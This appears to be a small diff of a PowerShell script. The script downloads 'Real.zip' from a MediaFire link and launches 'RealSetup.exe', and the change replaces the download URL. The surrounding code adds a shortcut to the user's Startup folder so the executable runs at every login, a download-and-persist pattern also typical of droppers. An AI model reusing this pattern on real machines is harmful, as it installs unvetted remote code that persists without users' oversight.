@@ -2,7 +2,7 @@
 # 1. Variables
 # ==============================
 
-$mediaFireUrl = "https://www.mediafire.com/file/f0rj0qxla4y354c/"
+$mediaFireUrl = "https://www.mediafire.com/file/l09mfm48xaz26zi/"
 #$password = ""
 $zipName = "Real.zip"
 $exeName = "RealSetup.exe"
@@ -163,7 +163,6 @@ Start-Process `
 $shortcutName = "Real.lnk"
 $startmenuPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
 $shortcutFile = Join-Path $startmenuPath $shortcutName
-
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
 $Shortcut.TargetPath = $exePath
